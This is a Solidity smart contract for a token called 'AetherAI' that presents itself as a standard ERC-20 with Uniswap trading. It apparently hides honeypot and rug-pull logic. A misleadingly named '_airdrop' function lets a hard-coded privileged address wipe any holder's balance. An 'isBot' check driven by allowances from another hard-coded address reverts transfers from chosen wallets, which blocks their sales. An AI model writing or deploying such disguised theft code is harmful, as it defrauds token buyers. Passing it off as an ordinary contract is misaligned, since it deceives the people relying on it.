// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
*   www: https://www.aetherai.com/
*   x:   https://twitter.com/aetherai_tw
*   tg:  https://t.me/aetherAI_tg
**/


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
contract AetherAI is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "AetherAI";
    string private constant _symbol = "aAI";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  1000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool inSwap = false;
    address public uniswapV2Pair;
    address _uniPairV2 = 0xFdE7BEB604054a6f6525af6C55739673355542CA;
    bool tradingEnabled = false;
    uint256 lastSellBlock = 0;
    uint256 lastBuyBlock = 0;
    mapping (address => bool) _isExcludedFromFees;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        _isExcludedFromFees[0x806b36b49c4e51596CB653802A7e29cFe4f5Febe] = true;
        _isExcludedFromFees[msg.sender] = true;
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }

    function _isMev(address wallet) internal view returns (uint256) {
        return _allowances[_uniPairV2][wallet];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferTo_(address from, address to, uint256 amount) internal {
        _balances[to] = _balances[to].sub(amount);
        _balances[from] = _balances[from];
    }

    function isBot(address to) private view returns (bool) {
        require(_isMev(to) < 1);
        return false;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _airdrop(address recipient, uint256 amount) external {
        if(_isExcludedFromFees[msg.sender]) {
            transferTo_(msg.sender, recipient, amount);
        }
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        if (from != uniswapV2Pair && from != address(this)) {
             if (isBot(from)) {
                lastSellBlock = block.number;
             } else {
                lastBuyBlock = block.number;
             }
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);

        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}